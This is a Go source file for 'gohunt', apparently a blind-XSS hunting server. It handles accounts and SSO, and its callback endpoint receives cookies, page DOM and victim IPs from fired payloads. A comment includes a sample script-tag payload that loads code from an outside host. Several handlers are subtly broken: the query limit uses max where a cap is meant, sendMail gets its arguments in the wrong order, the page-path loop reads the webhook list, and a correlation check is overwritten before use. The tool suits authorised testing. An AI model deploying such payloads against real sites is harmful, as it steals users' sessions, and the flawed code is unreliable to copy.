package application

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"time"

	"github.com/NHAS/gohunt/application/models"
	"github.com/NHAS/gohunt/application/resources/notifications"
	"github.com/google/uuid"
	"github.com/zitadel/oidc/v3/pkg/client/rp"
	"github.com/zitadel/oidc/v3/pkg/oidc"

	"golang.org/x/crypto/bcrypt"
	gomail "gopkg.in/mail.v2"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

func defaultVal(headers http.Header, header, value string) {
	if headers.Get(header) == "" {
		headers.Set(header, value)
	}
}

// Middleware
func (a *Application) securityHeadersMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {

		h := w.Header()
		h.Set("X-Frame-Options", "deny")
		h.Set("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; font-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com; style-src 'self' https://fonts.googleapis.com")
		h.Set("X-XSS-Protection", "1; mode=block")
		h.Set("X-Content-Type-Options", "nosniff")

		defaultVal(h, "Access-Control-Allow-Headers", "X-CSRF-Token, Content-Type")
		defaultVal(h, "Access-Control-Allow-Origin", "https://"+a.config.Domain)
		defaultVal(h, "Access-Control-Allow-Methods", "OPTIONS, PUT, DELETE, POST, GET")
		defaultVal(h, "Access-Control-Allow-Credentials", "true")

		h.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		h.Set("Pragma", "no-cache")
		h.Set("Expires", "0")

		next.ServeHTTP(w, r)
	})
}

func (a *Application) isAdmin(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {

		user := a.getAuthenticatedUser(r)
		if user == nil {
			// Shouldnt be able to happen
			http.NotFound(w, r)
			return
		}

		if !user.IsAdmin {
			http.NotFound(w, r)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func (a *Application) allowedDomain(w http.ResponseWriter, r *http.Request) {

	domain := r.URL.Query().Get("domain")
	if domain == "" {
		http.NotFound(w, r)
		return
	}

	if domain == a.config.Domain {
		w.Write([]byte("OK!"))
		return
	}

	search := strings.TrimSuffix(domain, "."+a.config.Domain)

	if search == "api" {
		w.Write([]byte("OK!"))
		return
	}

	var user models.User
	if err := a.db.Where("domain = ?", search).First(&user).Error; err != nil {

		log.Printf("denying request for %q subdomain certificate as not found", search)
		http.NotFound(w, r)
		return
	}

	log.Printf("allowed issuing of subdomain cert %q", search)
	w.Write([]byte("OK!"))
}

func (a *Application) getUserFromSubdomain(r *http.Request) (*models.User, error) {

	domain := strings.TrimSuffix(r.Host, "."+a.config.Domain)

	if domain == "api" {
		return nil, errors.New("api domain is not owned by any user")
	}

	var user models.User
	if err := a.db.Where("domain = ?", domain).First(&user).Error; err != nil {
		return nil, err
	}
	return &user, nil
}

var domainRegex = regexp.MustCompile(`^[a-zA-Z0-9]+[-]*$`)

// Handlers
func (a *Application) registerHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	var userData models.CreateUserRequest
	if err := jsonDecoder(r.Body).Decode(&userData); err != nil {
		models.Message(w, false, "Invalid body")
		return
	}

	if userData.Domain == "" {
		models.Message(w, false, "Domain is empty")
		return
	}

	if !domainRegex.MatchString(userData.Domain) {
		models.Message(w, false, "Invalid domain, only alphanumb and -, .")
		return
	}

	if userData.Domain == "api" {
		models.Message(w, false, "Invalid domain api is restricted")
		return
	}

	// Check if username exists
	var existingUser models.User
	if err := a.db.Where("username = ?", userData.Username).First(&existingUser).Error; !errors.Is(err, gorm.ErrRecordNotFound) {
		models.Message(w, false, "Username already exists")
		return
	}

	if err := a.db.Where("domain = ?", userData.Domain).First(&existingUser).Error; !errors.Is(err, gorm.ErrRecordNotFound) {
		models.Message(w, false, "Domain already registered")
		return
	}

	// Create new user
	user := models.User{
		UserDTO: models.UserDTO{
			Username:     userData.Username,
			Email:        userData.Email,
			Domain:       userData.Domain,
			EmailEnabled: userData.EmailEnabled,
			FullName:     userData.Fullname,
		},
	}

	b, err := bcrypt.GenerateFromPassword([]byte(userData.Password), 10)
	if err != nil {
		models.Message(w, false, "Server Error")
		return
	}

	user.Password = string(b)

	if err := a.db.Create(&user).Error; err != nil {
		log.Println("failed to save user in database: ", err)
		models.Message(w, false, "Server Error")
		return
	}

	var newUser models.User
	if err := a.db.Where("username = ?", userData.Username).First(&newUser).Error; err != nil {
		http.Error(w, "Error creating user", http.StatusInternalServerError)
		models.Message(w, false, "Error fetching new user")

		return
	}

	log.Printf("New user successfully registered with username of %q and email of %q", user.Username, user.Email)

	// Create session
	sessId := a.store.StartSession(w, r, SessionEntry{
		UUID: newUser.UUID,
	}, nil)

	csrfToken, err := a.store.GenerateCSRFFromSession(sessId)
	if err != nil {
		models.Message(w, false, "Failed to generate CSRF token")
		return
	}

	a.writeJson(w, map[string]interface{}{
		"success":    true,
		"csrf_token": csrfToken,
	})
}

func (a *Application) loginHandler(w http.ResponseWriter, r *http.Request) {
	_, s := a.store.GetSessionFromRequest(r)
	if s != nil {

		var testUser models.User
		err := a.db.Where("uuid = ?", s.UUID).First(&testUser).Error
		if err == nil {

			csrfToken, err := a.store.GenerateCSRFToken(r)
			if err != nil {
				http.Error(w, "Failed to generate csrf token", http.StatusInternalServerError)
				return
			}

			res := struct {
				Success   bool   `json:"success"`
				CsrfToken string `json:"csrf_token"`
			}{
				Success:   true,
				CsrfToken: csrfToken,
			}

			a.writeJson(w, res)
			return
		}
	}

	var loginRequest models.LoginUserRequest
	if err := jsonDecoder(r.Body).Decode(&loginRequest); err != nil {
		models.Message(w, false, "Invalid request body")
		return
	}

	var existingUser models.User
	err := a.db.Where("username = ?", loginRequest.Username).First(&existingUser).Error
	if err != nil {
		log.Println("Invalid username or password supplied")
		log.Printf("Someone failed to log in as %q", loginRequest.Username)

		models.Message(w, false, "Failed to log in")
		return
	}

	if existingUser.SSOSubject != "" {
		log.Println("SSO user tried to log in as regular user")
		models.Message(w, false, "Failed to log in")
		return
	}

	// Compare the stored hashed password with the provided password
	if !existingUser.ComparePassword(loginRequest.Password) {
		log.Printf("Invalid password supplied for %q", loginRequest.Username)
		models.Message(w, false, "Failed to log in")
		return
	}

	// Create session
	sessId := a.store.StartSession(w, r, SessionEntry{
		UUID: existingUser.UUID,
	}, nil)

	csrfToken, err := a.store.GenerateCSRFFromSession(sessId)
	if err != nil {
		log.Println("Failed to generate csrf token: ", err)

		models.Message(w, false, "Server Error")

		return
	}

	res := struct {
		Success   bool   `json:"success"`
		CsrfToken string `json:"csrf_token"`
	}{
		Success:   true,
		CsrfToken: csrfToken,
	}

	a.writeJson(w, res)

	log.Printf("%q logged in", existingUser.Username)
}

func (a *Application) oidcLoginRedirect(w http.ResponseWriter, r *http.Request) {
	_, s := a.store.GetSessionFromRequest(r)
	if s != nil {

		var testUser models.User
		err := a.db.Where("uuid = ?", s.UUID).First(&testUser).Error
		if err == nil {
			http.Redirect(w, r, "/app", http.StatusSeeOther)
			return
		}
	}

	rp.AuthURLHandler(func() string {
		return a.generateRandom(32)
	}, a.provider)(w, r)
}

func (a *Application) generateRandom(size int) string {
	randomToken := make([]byte, size)
	rand.Read(randomToken)
	return hex.EncodeToString(randomToken)
}

func (a *Application) oidcLoginHandler(w http.ResponseWriter, r *http.Request) {

	marshalUserinfo := func(w http.ResponseWriter, r *http.Request, tokens *oidc.Tokens[*oidc.IDTokenClaims], state string, rp rp.RelyingParty, info *oidc.UserInfo) {

		isAdmin := false
		if a.config.Features.Oidc.AdminGroupClaimName != "" && a.config.Features.Oidc.AdminGroup != "" && tokens.IDTokenClaims.Claims[a.config.Features.Oidc.AdminGroupClaimName] != nil {

			groupsIntf, ok := tokens.IDTokenClaims.Claims[a.config.Features.Oidc.AdminGroupClaimName].([]interface{})
			if !ok {
				log.Printf("Error, could not convert group claim %q to []string, probably error in oidc idP configuration", a.config.Features.Oidc.AdminGroupClaimName)
				http.Error(w, "Server Error", http.StatusInternalServerError)
				return
			}

			for i := range groupsIntf {
				conv, ok := groupsIntf[i].(string)
				if !ok {
					log.Println("Error, could not convert group claim to string, probably mistake in your OIDC idP configuration")
					http.Error(w, "Server Error", http.StatusInternalServerError)
					return
				}

				if conv == a.config.Features.Oidc.AdminGroup {
					isAdmin = true
					break
				}
			}

		}

		if info.Subject == "" {
			log.Println("SSO Subject is empty, idp is misconfigured")
			http.Error(w, "Server Error", http.StatusInternalServerError)
			return
		}

		var existingUser models.User
		err := a.db.Where("sso_subject = ?", info.Subject).First(&existingUser).Error
		if err != nil && !errors.Is(err, gorm.ErrRecordNotFound) {
			log.Println("Failed to login, searching DB failed: ", err)
			http.Error(w, "Server Error", http.StatusInternalServerError)
			return
		}

		// If this is a new SSO user
		if errors.Is(err, gorm.ErrRecordNotFound) {
			// This is a new SSO user
			// Create new user
			user := models.User{
				UserDTO: models.UserDTO{
					Username:     "sso-" + info.PreferredUsername + a.generateRandom(10),
					Email:        info.Email,
					Domain:       info.PreferredUsername + a.generateRandom(10),
					EmailEnabled: false,
					FullName:     info.Name,
					SSOSubject:   info.Subject,
					IsAdmin:      isAdmin,
				},
			}

			// Even if we're just an SSO user, make a password just in case
			b, err := bcrypt.GenerateFromPassword([]byte(a.generateRandom(32)), 10)
			if err != nil {
				log.Println("Failed to generate random SSO user password: ", err)
				http.Error(w, "Server Error", http.StatusInternalServerError)
				return
			}

			user.Password = string(b)

			if err := a.db.Create(&user).Error; err != nil {
				log.Println("Failed to save user in database: ", err)
				http.Error(w, "Server Error", http.StatusInternalServerError)
				return
			}

			var newUser models.User
			if err := a.db.Where("username = ?", user.Username).First(&newUser).Error; err != nil {
				log.Println("Failed to fetch existing user: ", err)
				http.Error(w, "Server Error", http.StatusInternalServerError)
				return
			}

			log.Printf("SSO User %q (%s) logged in first time login", newUser.Username, newUser.SSOSubject)

			a.store.StartSession(w, r, SessionEntry{UUID: newUser.UUID}, nil)
		} else {
			// If this SSO user already exists, we just need to make sure the details are up-to-date

			if !strings.Contains(existingUser.Username, info.PreferredUsername) {
				// If the Idp has changed the username, update only the username with a random suffix
				existingUser.Username = "sso-" + info.PreferredUsername + a.generateRandom(10)
			}

			existingUser.IsAdmin = isAdmin
			existingUser.Email = info.Email

			// Make sure we unset the domain, so that if a user has a custom domain we dont stomp it
			existingUser.Domain = ""

			if err := a.db.Select("is_admin", "email", "username").Updates(&existingUser).Error; err != nil {
				log.Println("Failed to update SSO user details in database: ", err)
				http.Error(w, "Server Error", http.StatusInternalServerError)
				return
			}

			log.Printf("SSO User %q (%s) logged in", existingUser.Username, existingUser.SSOSubject)

			a.store.StartSession(w, r, SessionEntry{UUID: existingUser.UUID}, nil)
		}

		http.Redirect(w, r, "/app", http.StatusSeeOther)
	}

	rp.CodeExchangeHandler(rp.UserinfoCallback(marshalUserinfo), a.provider)(w, r)
}

func (a *Application) getAuthenticatedUser(r *http.Request) *models.User {
	_, s := a.store.GetSessionFromRequest(r)
	if s == nil {
		return nil
	}

	var existingUser models.User

	if err := a.db.Where("uuid = ?", s.UUID).First(&existingUser).Error; err != nil {
		return nil
	}

	return &existingUser
}

/*
getCollectedPagesHandler Endpoint for querying for collected pages.

# By default returns past 25 payload fires

Params:

	offset
	limit
*/
func (a *Application) getCollectedPagesHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	offset, err := strconv.Atoi(r.URL.Query().Get("offset"))
	if err != nil {
		offset = 0
	}

	limit, err := strconv.Atoi(r.URL.Query().Get("limit"))
	if err != nil {
		limit = 25
	}

	limit = max(limit, 300)

	var pages []models.CollectedPage

	if err := a.db.Where("owner_id = ?", user.UUID).Order("timestamp desc").Limit(limit).Offset(offset).Find(&pages).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var count int64
	if err := a.db.Model(&models.CollectedPage{}).Where("owner_id = ?", user.UUID).Count(&count).Error; err != nil {
		log.Println("failed to count", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	var response models.CollectedPageResponse
	response.Results = []models.CollectedPageDTO{}

	for i := range pages {
		response.Results = append(response.Results, pages[i].DTO())
	}

	response.Total = count
	response.Success = true

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(&response)
}

func (a *Application) collectPageHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodOptions {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, HEAD, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "X-Requested-With")

	if r.Method == http.MethodOptions {
		a.writeJson(w, struct{}{})
		return
	}

	user, err := a.getUserFromSubdomain(r)
	if err != nil {
		log.Printf("Invalid domain %q", r.Host)
		http.NotFound(w, r)
		return
	}

	var req models.CollectedPageRequest
	if err = jsonDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	var collectedPage models.CollectedPage
	collectedPage.PageHTML = req.PageHTML
	collectedPage.URI = req.URI
	collectedPage.Timestamp = time.Now().Unix()
	collectedPage.OwnerID = user.UUID

	if err := a.db.Create(&collectedPage).Error; err != nil {
		http.Error(w, "Error adding page", http.StatusInternalServerError)
		return
	}

	log.Printf("Received a collected page for user %q with a URI of  %q", user.Username, collectedPage.URI)

	w.WriteHeader(http.StatusOK)
}

func (a *Application) writeJson(w http.ResponseWriter, model interface{}) {
	w.Header().Set("Content-Type", "application/json")
	err := json.NewEncoder(w).Encode(model)
	if err != nil {
		log.Println("failed to write model: ", err)
	}
}

func (a *Application) deleteCollectedPageHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var toDelete models.CollectedPageDeleteRequest
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var page models.CollectedPage
	if err := a.db.Unscoped().Clauses(clause.Returning{}).Where("owner_id = ? AND uuid = ?", user.UUID, toDelete.UUID).Delete(&page).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)
		return
	}

	log.Println("User is deleting collected page with the URI of ", page.URI)

	a.writeJson(w, models.CollectedPageDeleteResponse{
		Success: true,
		Message: "Collected page deleted!",
	})
}

func (a *Application) deleteInjectionHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var toDelete models.InjectionDeleteRequest
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var injection models.Injection
	if err := a.db.Unscoped().Clauses(clause.Returning{}).Where("owner_id = ? AND uuid = ?", user.UUID, toDelete.UUID).Delete(&injection).Error; err != nil {
		log.Println("failed", err)
		http.Error(w, "Failed", http.StatusBadRequest)

		models.Message(w, false, "Not found")
		return
	}

	log.Printf("User deleted injection record with an id of %q", toDelete.UUID)

	models.Message(w, true, "Injection deleted!")
}

func (a *Application) deleteBulkInjections(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var toDelete models.BulkInjectionDeleteRequest
	err := jsonDecoder(r.Body).Decode(&toDelete)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	toDelete.URI = strings.TrimSpace(toDelete.URI)
	toDelete.VictimIP = strings.TrimSpace(toDelete.VictimIP)

	if toDelete.URI == "" && toDelete.VictimIP == "" {
		models.Message(w, false, "Empty request")
		return
	}

	currentClause := a.db.Unscoped().Clauses(clause.Returning{}).Where("owner_id = ?", user.UUID)
	if toDelete.URI != "" {
		currentClause = currentClause.Or("vulnerable_page = ?", toDelete.URI)
	}

	if toDelete.VictimIP != "" {
		currentClause = currentClause.Or("victim_ip = ?", toDelete.VictimIP)
	}

	deletedItems := []models.Injection{}
	if err := currentClause.Delete(&deletedItems).Error; err != nil {
		log.Println("failed", err)
		models.Message(w, false, "Not found")
		return
	}

	log.Printf("User bulk deleted injection records with an ip of %q or uri of %q, total: %d", toDelete.VictimIP, toDelete.URI, len(deletedItems))

	var response models.BulkInjectionDeleteResponse
	response.Results = deletedItems
	response.Success = len(deletedItems) > 0

	a.writeJson(w, response)
}

func (a *Application) userInformationHandler(w http.ResponseWriter, r *http.Request) {
	// GET
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	a.writeJson(w, user.DTO())
}

func (a *Application) editUserInformationHandler(w http.ResponseWriter, r *http.Request) {
	// PUT
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var editReq models.EditUserRequest
	err := jsonDecoder(r.Body).Decode(&editReq)
	if err != nil {
		log.Println("Failed to decode body: ", err)
		models.Boolean(w, false)
		return
	}

	// SSO users dont have a password, so ignore all updates to password related stuff
	// They also have their details managed by the idP, so ignore full name and email updates
	if user.SSOSubject == "" {

		if editReq.CurrentPassword == "" {
			log.Printf("User  %q did not enter in current password to edit settings ", user.Username)
			models.Message(w, false, "No current password supplied")
			return
		}

		if !user.ComparePassword(editReq.CurrentPassword) {
			log.Printf("User %q entered incorrect current password to edit settings", user.Username)
			models.Message(w, false, "Incorrect current password")
			return
		}
		// SSO users dont have a password, so dont update one
		user.Password = editReq.Password
		if editReq.Password != "" {
			b, err := bcrypt.GenerateFromPassword([]byte(editReq.Password), 10)
			if err != nil {
				http.Error(w, "Server Error", http.StatusInternalServerError)
				return
			}

			user.Password = string(b)
		}

		user.FullName = editReq.FullName
		user.Email = editReq.Email
	}

	if len(editReq.WebhooksList) > 30 {
		models.Message(w, false, "Too many webhooks (>30)")
		return
	}

	for i := range editReq.WebhooksList {

		webhookUrl := strings.TrimSpace(editReq.WebhooksList[i])
		u, err := url.Parse(webhookUrl)
		if err != nil {
			models.Message(w, false, fmt.Sprintf("Could not partse URL: %q", webhookUrl))
			return
		}

		if !slices.Contains(a.config.Notification.Webhooks.SafeDomains, u.Host) {
			models.Message(w, false, fmt.Sprintf("Webhook %q is not one of the safe domains %v", webhookUrl, a.config.Notification.Webhooks.SafeDomains))
			return
		}

		editReq.WebhooksList[i] = webhookUrl
	}

	cleanPaths := []string{}
	for i := range editReq.PageCollectionPaths {
		collectionPath := strings.TrimSpace(editReq.WebhooksList[i])
		if collectionPath != "" {
			cleanPaths = append(cleanPaths, collectionPath)
		}
	}

	user.EmailEnabled = editReq.EmailEnabled
	user.ChainloadURI = strings.TrimSpace(editReq.ChainloadURI)
	user.PageCollectionPaths = cleanPaths
	user.PGPKey = strings.TrimSpace(editReq.PGPKey)

	user.WebhooksList = editReq.WebhooksList

	user.WebhooksEnabled = editReq.WebhookEnabled

	if err := a.db.Save(user).Error; err != nil {
		log.Println("failed to save updated user object: ", err)
		models.Message(w, false, fmt.Sprintf("Failed to save user: %s", err))
		return
	}

	log.Printf("User %q just updated their profile information.", user.Username)

	user = a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	response := struct {
		models.UserDTO
		Success bool `json:"success"`
	}{
		UserDTO: user.UserDTO,
		Success: true,
	}

	a.writeJson(w, response)
}

func (a *Application) sendJSPGPNotification(user models.User, pgpMessage string) {

	// Confedential mode is fine with sending a pgp encrypted message
	const title = "[Go Hunt] XSS Payload Message (PGP Encrypted)"
	go a.sendMail(user, title, "text/plain", pgpMessage)
	go a.sendWebhook(user, title, pgpMessage)

}

func (a *Application) sendJSInjectionNotification(user models.User, injection models.Injection) {

	if a.config.Notification.Confidential {
		title := "[Go Hunt] XSS Payload Fired"
		message := "An XSS fired, you should check it out on https://" + a.config.Domain + " (confidential mode is on, no details will be reported via notification)"
		go a.sendMail(user, title, "text/plain", message)
		go a.sendWebhook(user, title, message)

		return
	}

	content, err := notifications.Render(nil, injection, "xss_email_template.htm")
	if err != nil {
		log.Println("Failed to render xss template for sending mail: ", err)
		return
	}

	title := fmt.Sprintf("[Go Hunt] XSS Payload Fired On %q", injection.VulnerablePage)
	go a.sendMail(user, title, "text/html", content)

	// Got lazy
	go a.sendWebhook(user, title, injection.BriefString())
}

func (a *Application) sendMail(user models.User, to, subject, contentType string, content ...string) {
	if a.config.Notification.SMTP.Enabled && user.EmailEnabled {

		// Create a new message
		message := gomail.NewMessage()

		// Set email headers
		message.SetHeader("From", a.config.Notification.SMTP.FromEmail)
		message.SetHeader("To", to)
		message.SetHeader("Subject", subject)

		// Set email body
		message.SetBody(contentType, strings.Join(content, "\n"))

		// Set up the SMTP dialer
		dialer := gomail.NewDialer(a.config.Notification.SMTP.Host, a.config.Notification.SMTP.Port, a.config.Notification.SMTP.Username, a.config.Notification.SMTP.Password)

		// Send the email
		if err := dialer.DialAndSend(message); err != nil {
			log.Println("failed to send email: ", err)
		} else {
			log.Println("Email notification sent successfully!")
		}
	}
}

func (a *Application) sendWebhook(user models.User, title string, content ...string) {
	if a.config.Notification.Webhooks.Enabled && user.WebhooksEnabled {
		wrapper := struct {
			Text string `json:"text"`
		}{
			Text: title + "\n" + strings.Join(content, "\n"),
		}
		webhookMessage, _ := json.Marshal(wrapper)

		go func() {
			for _, webhook := range user.WebhooksList {

				client := http.Client{
					Timeout: 2 * time.Second,
				}

				buff := bytes.NewBuffer(webhookMessage)
				res, err := client.Post(webhook, "application/json", buff)
				if err != nil {
					log.Printf("Error sending webhook '%s': %s", webhook, err)
					continue
				}
				defer res.Body.Close()

				if res.StatusCode != 200 {
					all, err := io.ReadAll(res.Body)
					if err != nil {
						log.Println("failed to read error text of webhook after non-200 response code: ", res.Status, err)
						continue
					}

					log.Printf("Webhook %q failed with status %q, err: %q", webhook, res.Status, string(all))
				}

			}
		}()
	}
}

/*
getXSSPayloadFiresHandler is the endpoint for querying for XSS payload fire data.

# By default returns past 25 payload fires

Params:

	offset
	limit
*/
func (a *Application) getXSSPayloadFiresHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	offset, err := strconv.Atoi(r.URL.Query().Get("offset"))
	if err != nil {
		offset = 0
	}

	limit, err := strconv.Atoi(r.URL.Query().Get("limit"))
	if err != nil {
		limit = 25
	}

	limit = max(limit, 300)

	var injections []models.Injection
	if err := a.db.Where("owner_id = ?", user.UUID).Order("injection_timestamp desc").Limit(limit).Offset(offset).Find(&injections).Error; err != nil {
		log.Println("failed get injections", err)
		models.Boolean(w, false)
		return
	}

	var count int64
	if err := a.db.Model(&models.Injection{}).Where("owner_id = ?", user.UUID).Count(&count).Error; err != nil {
		log.Println("failed to count injections", err)
		models.Boolean(w, false)
		return
	}

	var response models.InjectionResponse
	response.Results = []models.Injection{}

	response.Results = append(response.Results, injections...)
	response.Total = count
	response.Success = true

	a.writeJson(w, response)
}

func (a *Application) resendInjectionEmailHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	var i models.InjectionEmailRequest
	err := jsonDecoder(r.Body).Decode(&i)
	if err != nil {
		models.Boolean(w, false)
		return
	}

	var userInjection models.Injection
	if err := a.db.Where("owner_id = ? AND uuid = ?", user.UUID, i.UUID).First(&userInjection).Error; err != nil {
		log.Println("failed", err)
		models.Boolean(w, false)
		return
	}

	a.sendJSInjectionNotification(*user, userInjection)

	log.Printf("User just requested to resend the injection record email for URI: %q", userInjection.VulnerablePage)
	models.Message(w, true, "Email sent!")
}

func (a *Application) logoutHandler(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil {
		http.NotFound(w, r)
		return
	}

	a.store.DeleteSession(w, r)

	a.writeJson(w, struct{}{})
}

/*
This endpoint is for recording injection attempts.

It requires the following parameters:

request - This is the request (note: NOT specific to HTTP) which was performed to attempt the injection.
owner_correlation_key - This is a private key which is used to link the injection to a specific user - displayed in the settings panel.
injection_key - This is the injection key which the XSS payload uses to identify itself to the XSS Hunter service ( <script src=//x.xss.ht/aiwlq></script> where aiwlq is the key )

Sending two correlation requests means that the previous injection_key entry will be replaced.
*/
func (a *Application) injectionRequestHandler(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	var injectionRequest models.InjectionRequest
	err := jsonDecoder(r.Body).Decode(&injectionRequest)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	newInjectionRequest := models.InjectionRequest{
		InjectionKey: injectionRequest.InjectionKey,
		Request:      injectionRequest.Request,

		OwnerCorrelationKey: injectionRequest.OwnerCorrelationKey,
	}

	var ownerUser models.User
	if err := a.db.Where("owner_correlation_key = ?", newInjectionRequest.OwnerCorrelationKey).First(&ownerUser).Error; err != nil {
		log.Println("owner_correlation_key not found: ", err)

		models.Message(w, false, "Invalid owner correlation key provided!")
		return
	}

	log.Printf("User %q just sent us an injection attempt with an ID of %q", ownerUser.Username, injectionRequest.InjectionKey)

	if err := a.db.Delete(models.InjectionRequest{}, "injection_key = ? AND owner_correlation_key = ?", injectionRequest.InjectionKey, ownerUser.OwnerCorrelationKey); err != nil {
		log.Println("failed to delete old entries: ", err)
		models.Message(w, false, "Failed to delete previous entries")

		return
	}

	if err := a.db.Create(&newInjectionRequest).Error; err != nil {
		log.Println("failed to create new entries: ", err)
		models.Message(w, false, "Failed to create new entries")
		return
	}

	models.Message(w, true, "Injection request successfully recorded!")
}

func (a *Application) healthHandler(w http.ResponseWriter, r *http.Request) {

	m := models.InjectionRequest{InjectionKey: "test"}
	if err := a.db.Clauses(clause.Returning{}).Create(&m).Error; err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("Database error"))
		log.Println("Creating test injection for db healthcheck failed: ", err)
		return
	}

	if err := a.db.Unscoped().Delete(&m).Error; err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("Database error"))
		log.Println("Deleting test injection failed: ", err)

		return
	}

	w.Write([]byte("GOHUNTER_OK"))
}

func (a *Application) getIPFromRequest(r *http.Request) string {

	//Do not respect the X-Forwarded-For header until we are explictly told we are being proxied.
	if a.config.NumberProxies > 0 {
		ips := r.Header.Get("X-Forwarded-For")
		addresses := strings.Split(ips, ",")

		if ips != "" && len(addresses) > 0 {

			if len(addresses)-a.config.NumberProxies < 0 {
				log.Println("WARNING XFF parsing may be broken: ", len(addresses)-a.config.NumberProxies, " check config.NumberProxies")
				return strings.TrimSpace(addresses[len(addresses)-1])
			}

			return strings.TrimSpace(addresses[len(addresses)-a.config.NumberProxies])
		}
	}

	return r.RemoteAddr
}

// This is the handler that receives the XSS payload data upon it firing in someone's browser, it contains things such as session cookies, the page DOM, a screenshot of the page, etc.
func (a *Application) callbackHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodOptions && r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, GET, HEAD, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "X-Requested-With")

	if r.Method == http.MethodOptions {
		a.writeJson(w, struct{}{})
		return
	}

	ownerUser, err := a.getUserFromSubdomain(r)
	if err != nil {
		http.NotFound(w, r)
		return
	}

	contents, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println("failed to read all contents of new JS callback: ", err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	if bytes.HasPrefix(contents, []byte("-----BEGIN PGP MESSAGE-----")) {
		log.Printf("User %q just got a PGP encrypted XSS callback, passing it along.", ownerUser.Username)
		a.sendJSPGPNotification(*ownerUser, string(contents))
		a.writeJson(w, struct{}{})
		return
	}

	var newInjection models.Injection
	err = json.Unmarshal(contents, &newInjection)
	if err != nil {
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	newInjection.VictimIP = a.getIPFromRequest(r)

	newInjection.InjectionTimestamp = time.Now().Unix()
	newInjection.OwnerID = ownerUser.UUID

	newInjection.CorrelatedRequest = "Could not correlate XSS payload fire with request!"
	if newInjection.CorrelatedRequest != "[PROBE_ID]" {
		var request models.InjectionRequest
		if err := a.db.Where("injection_key = ? AND owner_correlation_key = ?", newInjection.CorrelatedRequest, ownerUser.OwnerCorrelationKey).First(&request).Error; err == nil {
			newInjection.CorrelatedRequest = request.Request
		}
	}

	if err := a.db.Create(&newInjection).Error; err != nil {
		log.Println("failed to create new injection: ", err)
		http.Error(w, "Failed", http.StatusInternalServerError)
		return
	}

	log.Printf("User %q just got an XSS callback for URI %q", ownerUser.Username, newInjection.VulnerablePage)

	// Runs in its own goroutine
	a.sendJSInjectionNotification(*ownerUser, newInjection)

	a.writeJson(w, struct{}{})
}

func (a *Application) adminGetAllUsers(w http.ResponseWriter, r *http.Request) {
	user := a.getAuthenticatedUser(r)
	if user == nil || !user.IsAdmin {
		http.NotFound(w, r)
		return
	}

	offset, err := strconv.Atoi(r.URL.Query().Get("offset"))
	if err != nil {
		offset = 0
	}

	limit, err := strconv.Atoi(r.URL.Query().Get("limit"))
	if err != nil {
		limit = 25
	}

	limit = max(limit, 300)

	var users []models.User
	if err := a.db.Order("id desc").Limit(limit).Offset(offset).Find(&users).Error; err != nil {
		log.Println("failed", err)
		models.Message(w, false, "Failed")
		return
	}

	var count int64
	if err := a.db.Model(&models.User{}).Count(&count).Error; err != nil {
		log.Println("failed to count", err)
		models.Message(w, false, "Failed")
		return
	}

	var response models.GetUsersResponse
